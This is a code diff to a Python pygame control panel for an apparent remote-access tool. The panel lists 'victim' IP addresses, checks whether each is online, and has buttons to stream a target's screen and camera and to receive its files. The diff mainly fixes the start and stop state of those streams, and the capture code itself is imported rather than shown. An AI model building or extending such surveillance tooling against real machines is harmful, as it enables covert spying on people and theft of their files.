@@ -9,8 +9,8 @@ import socket
 import argparse
 import sys
 import threading
-import queue
-from concurrent.futures import ThreadPoolExecutor
+# import queue
+# from concurrent.futures import ThreadPoolExecutor
 
 from ui.components.colors import *
 from ui.components.display import Display
@@ -19,7 +19,7 @@ from ui.components.input_box import InputBox
 from ui.handlers.screen_handler import screenreceiver
 from ui.handlers.camera_handler import camerareceiver
 from ui.handlers.file_handler import receive_file
-from ui.utils.network import R_tcp
+# from ui.utils.network import R_tcp
 
 # Initialize Pygame
 pygame.init()
@@ -33,10 +33,9 @@ pygame.display.set_caption("Remote Desktop Menu")
 font = pygame.font.Font(None, 36)
 
 # Vector victim origin
-VICTIM_IPS = ['10.20.2.200', '10.20.2.165', '10.10.27.0']
+VICTIM_IPS = ['10.10.27.0', '10.10.27.44', '10.10.26.245']
 
 # Thread pool for background tasks
-thread_pool = ThreadPoolExecutor(max_workers=4)
 
 
 class UIState:
@@ -101,7 +100,7 @@ def status_checker_thread(options):
         for host in options.hosts:
             status = check_single_victim(host, options.port)
             ui_state.victims_status[host] = status
-        pygame.time.delay(2000)  
+        pygame.time.delay(2000)  # Check every 2 seconds
 
 
 def draw_static_frame(surface, frame_rect, border_color=(0, 0, 0), border_width=2):
@@ -118,6 +117,7 @@ def show_full_screen(display, options):
 
     screen_receiver = None
     camera_receiver = None
+    file_receiver = None
 
     clock = pygame.time.Clock()
 
@@ -126,7 +126,6 @@ def show_full_screen(display, options):
             if event.type == pygame.QUIT:
                 if screen_receiver:
                     screen_receiver.stop()
-                full_screen = False
                 return
             input_box.handle_event(event, options.port)
 
@@ -138,24 +137,36 @@ def show_full_screen(display, options):
                         full_screen = False
                     elif camera_button.rect.collidepoint(event.pos):
                         if camera_button.text == "Start Camera":
+                            ui_state.camera_running = True
                             camera_button.text = "Stop Camera"
                             camera_receiver = camerareceiver(display.text, options.port + 2)
                         else:
                             camera_button.text = "Start Camera"
                             ui_state.camera_running = False
+                            if camera_receiver:
+                                camera_receiver.stop()
+                                camera_receiver = None
                     elif screen_button.rect.collidepoint(event.pos):
                         if screen_button.text == "Start Screen":
+                            ui_state.screen_running = True
                             screen_button.text = "Stop Screen"
                             screen_receiver = screenreceiver(display.text, options.port + 1)
                         else:
                             screen_button.text = "Start Screen"
+                            ui_state.screen_running = False
                             if screen_receiver:
                                 screen_receiver.stop()
                                 screen_receiver = None
                     elif file_button.rect.collidepoint(event.pos):
                         if file_button.text == "Receive File":
                             file_button.text = "Received"
-                            thread_pool.submit(lambda: receive_file("0.0.0.0", display.text, options.port + 3))
+                            ui_state.file_sending = True
+                            file_receiver = receive_file("0.0.0.0",display.text, options.port + 3)
+                        else:
+                            file_button.text = "Receive File"
+                            ui_state.file_sending = False
+                            if file_receiver:
+                                file_receiver = None
 
         try:
             screen.fill(WHITE)
@@ -171,12 +182,13 @@ def show_full_screen(display, options):
             # Cập nhật nội dung bên trong khung
             if screen_receiver and screen_receiver.double_buffer:
                 screen.blit(screen_receiver.double_buffer, frame_rect)
+                text_surface = font.render("", True, BLACK)
             else:
                 screen.blit(text_surface, text_rect)
             
             if camera_receiver and camera_receiver.double_buffer:
                 # Tạo Surface từ buffer camera_receiver
-
+                text_surface = font.render("", True, BLACK)
                 screen.blit(camera_receiver.double_buffer, frame_rect)
             else:
                 screen.blit(text_surface, text_rect)
@@ -205,9 +217,6 @@ def main():
     # Start status checker thread
     status_thread = threading.Thread(target=status_checker_thread, args=(options,), daemon=True)
     status_thread.start()
-
-    clock = pygame.time.Clock()
-
     while ui_state.running:
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
@@ -247,7 +256,6 @@ def main():
         pygame.display.flip()
 
     # Cleanup
-    thread_pool.shutdown(wait=False)
     pygame.quit()
 
 
